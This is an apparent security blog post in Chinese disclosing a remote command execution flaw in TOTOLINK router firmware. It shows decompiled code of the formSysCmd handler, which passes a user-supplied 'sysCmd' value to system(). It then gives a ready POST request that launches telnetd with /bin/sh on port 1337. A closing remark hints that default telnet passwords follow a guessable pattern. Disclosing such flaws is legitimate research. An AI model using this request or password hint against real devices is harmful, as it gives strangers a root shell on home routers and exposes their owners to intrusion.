---
title: TOTOLINK RCE
categories: technology
date: 2020-01-31 22:06:05
tags: [TOTOLINK, IOT, RCE]
---

搞完了搜一下发现居然好久以前就有人提了 Orz 这么久都没修，干脆发出来好了，顺便好久没写博客了，更新一发

由于家里路由器还在用，不能拿来接TTL，所以上官网找了个其他版本的固件，对比了一下已知的页面发现是通用的

下载下来的固件web目录里有个syscmd.htm，但是在页面中看不到功能的接口，但是模拟跑起来的固件页面中是存在的

![](/images/截屏2020-01-3122.16.48.png)

查看页面发现请求的地址是 `/boafrm/formSysCmd`

后端代码在 /bin/boa 文件中, 找到formSysCmd对应的函数

```
004821c4 10 f7 45 00     addr       s_formSysCmd_0045f710                            = "formSysCmd"
004821c8 ac 62 44 00     addr       FUN_004462ac
```

跟进去

```c
void FUN_004462ac(undefined4 param_1)
{
  undefined4 uVar1;
  char *pcVar2;
  int local_88;
  char acStack132 [100];
  char *local_20;
  
  local_88 = 0;
  uVar1 = FUN_0040fbac(param_1,"submit-url",0x46fbe0);
  local_20 = (char *)FUN_0040fbac(param_1,"sysCmd",0x46fbe0);
  pcVar2 = (char *)FUN_0040fbac(param_1,"sysCmdselect",0x46fbe0);
  local_88 = (int)*pcVar2 + -0x30;
  apmib_set(0x4e70,&local_88);
  if (*local_20 != '\0') {
    snprintf(acStack132,100,"%s 2>&1 > %s  &",local_20,"/tmp/syscmd.log”);
    unlink("/tmp/syscmd.log");
    system(acStack132);
  }
  system("sleep 5");
  FUN_0040c20c(param_1,uVar1);
  return;
}
```

其中 `submit-url`, `sysCmd`, `sysCmdselect` 为提交的三个参数，这里不一样的是我家里路由器提交的参数是没有 `sysCmdselect` 的，页面长这样

![](/images/截屏2020-01-3122.20.30.png)

提交的参数变化就是 `sysCmdselect` 变成了 `apply`，`sysCmd` 就是提交的命令，直接format一下拼接个命令就带进去执行了

直接post一下就可以了

```
POST /boafrm/formSysCmd

sysCmd=telnetd -l /bin/sh -p 1337&apply=Apply&submit-url=%2Fsyscmd.htm
```

![](/images/QQ20200131-222801@2x.jpg)

---

PS: 另外我发现家里路由器默认开了telnet, 而且密码后面找到后发现不像是个随机密码，没测其他设备，感兴趣的阔以瞅瞅自己totolink默认开telnet后的密码是不是c开头，四位数